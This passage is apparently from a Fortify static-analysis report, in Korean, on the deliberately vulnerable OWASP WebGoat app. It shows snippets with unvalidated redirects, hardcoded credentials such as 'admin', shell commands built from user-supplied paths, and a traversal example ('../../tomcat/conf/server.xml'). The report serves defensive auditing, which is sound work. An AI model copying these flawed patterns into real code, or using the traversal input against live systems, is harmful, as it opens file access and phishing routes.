                        <Issue iid="C86A891B36E42BF0DE95533BE14256E1" ruleID="7B5AF271-BDC5-4ABE-A93A-316A14FA9028">
                            <Category>Open Redirect</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>config.jsp 파일은 12 줄의 HTTP 리디렉션 함수에 확인되지 않은 데이터를 전달합니다. 리디렉션에 사용된 URL을 제어하도록 확인되지 않은 입력을 허용하면 피싱 공격에 도움이 됩니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>config.jsp</FileName>
<FilePath>WebContent/lessons/ConfManagement/config.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;succeeded=yes"); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.sendRedirect()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>config.jsp</FileName>
<FilePath>WebContent/lessons/ConfManagement/config.jsp</FilePath>
<LineStart>11</LineStart>
<Snippet>&lt;body&gt;
&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;succeeded=yes"); </Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F6CD023C7BCC36C2C28232A560005079" ruleID="7B5AF271-BDC5-4ABE-A93A-316A14FA9028">
                            <Category>Open Redirect</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>redirect.jsp 파일은 12 줄의 HTTP 리디렉션 함수에 확인되지 않은 데이터를 전달합니다. 리디렉션에 사용된 URL을 제어하도록 확인되지 않은 입력을 허용하면 피싱 공격에 도움이 됩니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>redirect.jsp</FileName>
<FilePath>WebContent/lessons/General/redirect.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;fromRedirect=yes&amp;language=" + request.getParameter("language")); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.sendRedirect()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>redirect.jsp</FileName>
<FilePath>WebContent/lessons/General/redirect.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;fromRedirect=yes&amp;language=" + request.getParameter("language")); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A65EB364AA4A70FB8F0DC54E696FECAC" ruleID="7B5AF271-BDC5-4ABE-A93A-316A14FA9028">
                            <Category>Open Redirect</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>redirect.jsp 파일은 12 줄의 HTTP 리디렉션 함수에 확인되지 않은 데이터를 전달합니다. 리디렉션에 사용된 URL을 제어하도록 확인되지 않은 입력을 허용하면 피싱 공격에 도움이 됩니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>redirect.jsp</FileName>
<FilePath>WebContent/lessons/General/redirect.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;fromRedirect=yes&amp;language=" + request.getParameter("language")); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.sendRedirect()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>redirect.jsp</FileName>
<FilePath>WebContent/lessons/General/redirect.jsp</FilePath>
<LineStart>11</LineStart>
<Snippet>&lt;body&gt;
&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;fromRedirect=yes&amp;language=" + request.getParameter("language")); </Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="778BDE257A877D8A9BA91D26FD8BCC4C" ruleID="7B5AF271-BDC5-4ABE-A93A-316A14FA9028">
                            <Category>Open Redirect</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>config.jsp 파일은 12 줄의 HTTP 리디렉션 함수에 확인되지 않은 데이터를 전달합니다. 리디렉션에 사용된 URL을 제어하도록 확인되지 않은 입력을 허용하면 피싱 공격에 도움이 됩니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>config.jsp</FileName>
<FilePath>WebContent/lessons/ConfManagement/config.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;succeeded=yes"); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.sendRedirect()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>config.jsp</FileName>
<FilePath>WebContent/lessons/ConfManagement/config.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;succeeded=yes"); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="03D6F4D45B8103BA1DA7BC09AFFD2B60" ruleID="7B5AF271-BDC5-4ABE-A93A-316A14FA9028">
                            <Category>Open Redirect</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>redirect.jsp 파일은 12 줄의 HTTP 리디렉션 함수에 확인되지 않은 데이터를 전달합니다. 리디렉션에 사용된 URL을 제어하도록 확인되지 않은 입력을 허용하면 피싱 공격에 도움이 됩니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>redirect.jsp</FileName>
<FilePath>WebContent/lessons/General/redirect.jsp</FilePath>
<LineStart>12</LineStart>
<Snippet>&lt;% response.sendRedirect("/WebGoat/attack?" +
		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;fromRedirect=yes&amp;language=" + request.getParameter("language")); 
%&gt;</Snippet>
<TargetFunction>javax.servlet.http.HttpServletResponse.sendRedirect()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>redirect.jsp</FileName>
<FilePath>WebContent/lessons/General/redirect.jsp</FilePath>
<LineStart>13</LineStart>
<Snippet>		        "Screen=" + request.getParameter("Screen") +
		        "&amp;menu=" + request.getParameter("menu") +
		        "&amp;fromRedirect=yes&amp;language=" + request.getParameter("language")); 
%&gt;
&lt;/body&gt;</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Password Management: Password in Configuration File</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>구성 파일에 일반 텍스트 암호를 저장하면 시스템 침해가 발생할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>일반 텍스트 암호를 구성 파일에 저장하면 파일을 읽을 수 있는 사용자는 누구나 암호로 보호되는 리소스 접근이 허용됩니다. 때때로 개발자가 구성에 대한 접근 권한이 있는 사람에게서 응용 프로그램을 방어할 수 없다고 생각하는 경우가 있는데 이런 태도가 공격자에게 유리하게 작용합니다. 좋은 암호 관리 지침에 따르면 암호를 일반 텍스트로 저장하지 않아야 합니다.

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>암호를 일반 텍스트로 저장해서는 안 됩니다. 시스템이 시작될 때 관리자에게 암호를 입력하도록 요구해야 합니다. 이 방법을 사용할 수 없을 때 안전성은 떨어지지만 비교적 타당한 솔루션은 암호를 난독 처리하고 시스템에 난독 처리 해제 요소를 분산시켜 공격자가 여러 시스템 리소스를 확보하여 정확하게 조합해야만 암호를 해독할 수 있게 만드는 것입니다.

일부 타사 제품에 보다 안전한 방법으로 암호를 관리하는 기능이 있다고 합니다. 예를 들면, WebSphere Application Server 4.x는 간단한 XOR 암호화 알고리즘을 사용하여 값을 난독 처리하지만 그 기능을 신뢰하기 어렵습니다. WebSphere 및 기타 응용 프로그램 서버는 보안에 민감한 환경에는 불충분한 오래되고 비교적 약한 암호화 메커니즘을 제공합니다. 보안 솔루션의 경우 현실성 있는 유일한 옵션은 독점적 솔루션을 사용하는 것입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer는 구성 파일에서 암호 속성에 사용되는 일반 이름을 검색합니다. 플래그가 지정된 항목이 암호로 사용되고 있고 암호 항목에 일반 텍스트가 포함되어 있는지 확인하여 이러한 문제를 감사하십시오.

2. 구성 파일의 항목이 기본 암호인 경우 이를 변경해야 할 뿐 아니라 구성 파일에서 난독 처리해야 합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CA01C2FE2A75E8E8C1746C81ABF71530" ruleID="8FF9A602-1DDF-491F-B2D5-55A5B15C60C7">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>구성 파일에 일반 텍스트 암호를 저장하면 시스템 침해가 발생할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EmployeesData.xml</FileName>
<FilePath>WebContent/lessons/XPATHInjection/EmployeesData.xml</FilePath>
<LineStart>18</LineStart>
<Snippet>		&lt;loginID&gt;Sarah&lt;/loginID&gt;
		&lt;accountno&gt;23363&lt;/accountno&gt;
		&lt;passwd&gt;secret&lt;/passwd&gt;
		&lt;salary&gt;84000&lt;/salary&gt;
	&lt;/employee&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="389F6E68A2C3DFF3011346362DAC7F4B" ruleID="26FA1D1C-C9AE-4D45-9D0D-2972534ECDCE">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>구성 파일에 일반 텍스트 암호를 저장하면 시스템 침해가 발생할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>build.xml</FileName>
<FilePath>build.xml</FilePath>
<LineStart>85</LineStart>
<Snippet>  &lt;property name="manager.url"   		   value="http://localhost/manager"/&gt;
  &lt;property name="manager.username"   	   value="admin"/&gt; 			&lt;!-- UPDATE THIS! --&gt;
  &lt;property name="manager.password"   	   value="admin"/&gt; 			&lt;!-- UPDATE THIS! --&gt;
  &lt;property name="src.home"     		   value="${basedir}/JavaSource"/&gt;
  &lt;property name="web.home"      		   value="${basedir}/WebContent"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="CA01C2FE2A75E8E8C1746C81ABF7152F" ruleID="8FF9A602-1DDF-491F-B2D5-55A5B15C60C7">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>구성 파일에 일반 텍스트 암호를 저장하면 시스템 침해가 발생할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EmployeesData.xml</FileName>
<FilePath>WebContent/lessons/XPATHInjection/EmployeesData.xml</FilePath>
<LineStart>12</LineStart>
<Snippet>		&lt;loginID&gt;John&lt;/loginID&gt;
		&lt;accountno&gt;63458&lt;/accountno&gt;
		&lt;passwd&gt;myownpass&lt;/passwd&gt;
		&lt;salary&gt;559833&lt;/salary&gt;
	&lt;/employee&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="CA01C2FE2A75E8E8C1746C81ABF7152E" ruleID="8FF9A602-1DDF-491F-B2D5-55A5B15C60C7">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>구성 파일에 일반 텍스트 암호를 저장하면 시스템 침해가 발생할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>EmployeesData.xml</FileName>
<FilePath>WebContent/lessons/XPATHInjection/EmployeesData.xml</FilePath>
<LineStart>6</LineStart>
<Snippet>		&lt;loginID&gt;Mike&lt;/loginID&gt;
		&lt;accountno&gt;11123&lt;/accountno&gt;
		&lt;passwd&gt;test123&lt;/passwd&gt;
		&lt;salary&gt;468100&lt;/salary&gt;
	&lt;/employee&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9FB9464427B3254DC3A928611157C9C2" ruleID="9F6CA34F-B0C3-47E2-B679-17B0B1730C57">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>구성 파일에 일반 텍스트 암호를 저장하면 시스템 침해가 발생할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>server-config.wsdd</FileName>
<FilePath>WebContent/WEB-INF/server-config.wsdd</FilePath>
<LineStart>6</LineStart>
<Snippet>  &lt;parameter name="sendMultiRefs" value="true"/&gt;
  &lt;parameter name="disablePrettyXML" value="true"/&gt;
  &lt;parameter name="adminPassword" value="admin"/&gt;
&lt;!--
  &lt;parameter name="attachments.Directory" value="C:\webgoat\tomcat\webapps\WebGoat\WEB-INF\attachments"/&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="5">
                        <groupTitle>Path Manipulation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>공격자는 CommandInjection.java의 172 줄에 있는 File()의 파일 시스템 경로 인수를 제어할 수 있습니다. 그렇지 않으면 보호할 수 있는 파일을 공격자가 접근하거나 수정할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Path manipulation 오류는 다음 두 가지 조건을 만족할 때 발생합니다.

1. 공격자가 파일 시스템상의 작업에 사용되는 경로를 지정할 수 있습니다.

2. 공격자가 리소스를 지정하여 다른 방법으로는 허용되지 않는 권한을 얻습니다.

예를 들어, 프로그램이 공격자에게 지정한 파일을 덮어쓰거나 공격자가 제어하는 구성으로 실행할 수 있는 권한을 주는 것입니다.


예제 1: 다음 코드는 HTTP 요청의 입력을 사용하여 파일 이름을 만듭니다. 프로그래머는 공격자가 "../../tomcat/conf/server.xml" 등의 파일 이름을 제공하여 응용 프로그램이 자신의 구성 파일을 삭제하게 만들 가능성을 고려하지 않았습니다.


String rName = request.getParameter("reportName");
File rFile = new File("/usr/local/apfr/reports/" + rName);
...
rFile.delete();


예제 2: 다음 코드는 구성 파일의 입력을 사용하여 열 파일을 결정하고 사용자에게 돌려 보냅니다. 프로그램이 일정한 권한으로 실행되고 악의적인 사용자가 구성 파일을 변경할 수 있는 경우, 이 프로그램을 사용하여 시스템에서 확장명이 .txt인 파일을 읽을 수 있습니다.


fis = new FileInputStream(cfg.getProperty("sub")+".txt");
amt = fis.read(arr);
out.println(arr);


모바일 환경에서는 Path manipulation과 같은 전형적인 취약성이 발생하지 않는다고 생각하는 사용자도 있습니다. 자기 자신을 공격하는 사용자는 없을 것이라 여기기 때문입니다. 그러나 모바일 플랫폼의 핵심 요소는 다양한 소스에서 다운로드되어 같은 장치에서 함께 실행되는 응용 프로그램이라는 점을 유념해야 합니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 프로세스 간 통신을 포함하도록 모바일 응용 프로그램의 공격 표면을 확장해야 합니다.

예제 3: 다음 코드는 Example 1을 Android 플랫폼에 맞게 조정합니다.


...
        String rName = this.getIntent().getExtras().getString("reportName");
        File rFile = getBaseContext().getFileStreamPath(rName);
...
        rFile.delete();
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Path Manipulation을 예방하는 최선의 방법은 사용자가 선택해야 하는 올바른 값 목록을 생성하는 간접 참조를 사용하는 것입니다. 이 접근 방식을 사용하면 사용자 제공 입력이 리소스 이름을 지정하는 데 직접 사용되지 않습니다.

경우에 따라 올바른 리소스 이름 집합이 너무 크거나 유지 관리가 어렵기 때문에 이 접근 방식은 실용적이지 못합니다. 이때 프로그래머는 주로 거부 목록을 구현합니다. 거부 목록은 입력을 사용하기 전에 위험한 문자를 선별적으로 거부하거나 이스케이프 처리하는 데 사용됩니다. 하지만 안전하지 않은 문자의 목록은 불완전할 가능성이 크고 대부분 최신 상태를 유지하지 못합니다. 효율적인 접근 방식은 리소스 이름에 사용할 수 있는 문자의 목록을 만들어 목록에 있는 문자만으로 이루어진 입력만 받는 것입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 프로그램에서 수행한 사용자 지정 입력값 검증에 만족하는 경우 Fortify Custom Rules Editor를 사용하여 검증 루틴에 대한 정리 규칙을 작성합니다.

2. 효과적인 거부 목록을 구현하는 작업은 매우 어렵습니다. 검증 논리에 거부 목록을 구현해야 할 때는 신중해야 합니다. 다른 운영 체제, 데이터베이스 또는 기타 리소스에서 해석될 때 특수한 의미를 가질 수 있는 다른 메타 문자 집합 및 다른 유형의 입력 인코딩을 고려해 보십시오. 이 요구 사항이 끊임없이 변한다면 과연 거부 목록을 쉽고 정확하고 완전하게 업데이트할 수 있을 것인지 판단해야 합니다.

3. 많은 최신 웹 프레임워크는 사용자 입력의 검증을 수행하기 위한 메커니즘을 제공합니다(Struts 및 Spring MVC 포함). 확인되지 않은 입력의 소스를 강조하기 위해, Fortify 보안 코딩 규칙 팩은 악용 가능성을 낮추고 프레임워크 검증 메커니즘이 사용 중일 때마다 지원하는 증거에 포인터를 제공하여 Fortify Static Code Analyzer에서 보고한 문제의 우선 순위를 동적으로 재지정합니다. 이 기능을 Context-Sensitive Ranking(컨텍스트 감지 순위)이라고 부릅니다. Fortify 사용자의 감사 프로세스를 지원하기 위해, Fortify Software Security Research Group은 입력 소스에 적용된 검증 메커니즘에 따라 문제를 폴더로 그룹화하는 데이터 유효성 프로젝트 템플릿을 사용 가능하게 만듭니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>5</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A6ABD66A03A5E2632772F0318E15C2DF" ruleID="138700B9-C625-4262-9826-C8F3450D6838">
                            <Category>Path Manipulation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 CommandInjection.java의 172 줄에 있는 File()의 파일 시스템 경로 인수를 제어할 수 있습니다. 그렇지 않으면 보호할 수 있는 파일을 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>172</LineStart>
<Snippet>			    + safeDir.getPath() + "\"");
		    fileData = exec(s, "cmd.exe /c type \""
			    + new File(safeDir, helpFile).getPath() + "\"");

		}</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="14CE92280CDA2D010FC1B2096F04AC06" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 PathBasedAccessControl.java의 136 줄에 있는 File()의 파일 시스템 경로 인수를 제어할 수 있습니다. 그렇지 않으면 보호할 수 있는 파일을 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	    // We url Encode our dir name to avoid problems with special characters in our own path.
	    //File f = new File( new URI("file:///" + Encoding.urlEncode(dir).replaceAll("\\\\","/") + "/" + file.replaceAll("\\\\","/")) );
	    File f = new File((dir + "\\" + file).replaceAll("\\\\", "/"));

	    if (s.isDebug())</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A816DAC2936E8533ADD82949B24BAB3" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 LessonTracker.java의 238 줄에 있는 FileInputStream()의 파일 시스템 경로 인수를 제어할 수 있습니다. 그렇지 않으면 보호할 수 있는 파일을 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>238</LineStart>
<Snippet>		Properties tempProps = new Properties();
		//System.out.println("Loading lesson state from: " + fileName);
		in = new FileInputStream(fileName);
		tempProps.load(in);
		// allow the screen to use any custom properties it may have set</Snippet>
<TargetFunction>java.io.FileInputStream.FileInputStream()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>576</LineStart>
<Snippet>	}

	return request.getParameterNames();
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterNames()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BA25C24DE874F549CD77BE4663DFCC40" ruleID="823FE039-A7FE-4AAD-B976-9EC53FFE4A59">
                            <Category>Path Manipulation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 LessonTracker.java의 238 줄에 있는 FileInputStream()의 파일 시스템 경로 인수를 제어할 수 있습니다. 그렇지 않으면 보호할 수 있는 파일을 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>238</LineStart>
<Snippet>		Properties tempProps = new Properties();
		//System.out.println("Loading lesson state from: " + fileName);
		in = new FileInputStream(fileName);
		tempProps.load(in);
		// allow the screen to use any custom properties it may have set</Snippet>
<TargetFunction>java.io.FileInputStream.FileInputStream()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A6ABD66A03A5E2632772F0318E15C2E0" ruleID="138700B9-C625-4262-9826-C8F3450D6838">
                            <Category>Path Manipulation</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자는 CommandInjection.java의 183 줄에 있는 File()의 파일 시스템 경로 인수를 제어할 수 있습니다. 그렇지 않으면 보호할 수 있는 파일을 공격자가 접근하거나 수정할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>183</LineStart>
<Snippet>			    "/bin/sh",
			    "-c",
			    "cat \"" + new File(safeDir, helpFile).getPath()
				    + "\"" };
		    fileData = exec(s, cmd2);</Snippet>
<TargetFunction>java.io.File.File()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="4">
                        <groupTitle>Code Correctness: Erroneous String Compare</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>WeakAuthenticationCookie.java의 checkParams() 메서드는 문자열을 == 또는 !=이 아닌 equals() 메서드와 비교해야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>이 프로그램은 문자열이 같은지 비교하기 위해 == 또는 !=을 사용하는데 이 연산자는 두 개체의 값이 아닌 참조를 비교합니다. 두 참조가 같지 않을 가능성이 큽니다.

예제 1: 다음 분기는 실행되지 않습니다.


  if (args[0] == STRING_CONSTANT) {
      logger.info("miracle");
  }


== 및 != 연산자는 같은 개체에 포함된 문자열을 비교하도록 사용할 때에만 예상대로 작동합니다. 이를 위한 가장 일반적인 방법은 인턴(intern)된 문자열에 대한 것이고, 여기에서 이 문자열은 String 클래스에 의해 유지되는 개체의 풀에 추가할 수 있습니다. 한 번 문자열이 인턴(intern)되면, 모든 문자열 사용은 동일한 개체를 사용하고 같은 연산자가 예상대로 작동합니다. 모든 문자열 리터럴 및 문자열 값 상수는 자동으로 인턴(intern)됩니다. 다른 문자열은 String.intern()을 수동으로 호출하여 인턴할 수 있어 현재 문자열의 정규 인스턴스를 반환하고, 필요한 경우 하나를 생성합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>문자열을 비교할 때는 equals()를 사용하십시오. 

예제 2: Example 1의 코드는 다음과 같이 다시 작성할 수 있습니다.


  if (STRING_CONSTANT.equals(args[0])) {
      logger.info("could happen");
  }
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 개발자는 equals()를 호출하는 "비효율을 피하기 위해" 즉시 문자열의 참조가 같은지를 비교하기도 합니다.


 if (args[0] == STRING_CONSTANT) {
    doWork(args[0]);
 } else if (STRING_CONSTANT.equals(args[0])) {
    doWork(args[0]);
 }


대부분의 경우 이 작은 성능상의 이점은 코드가 복제되거나 엉키는 댓가를 지불해야 합니다. String.equals()는 더 자세한 평가를 하기 전에 == 비교를 수행하기 때문에 String.equals() 대신 ==를 사용하는 수행의 이점은 메서드 호출 수행의 오버헤드로 제한되고 최신 환경에서의 이점은 아주 미미합니다.
프로그램의 성능을 비교해 보십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>4</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
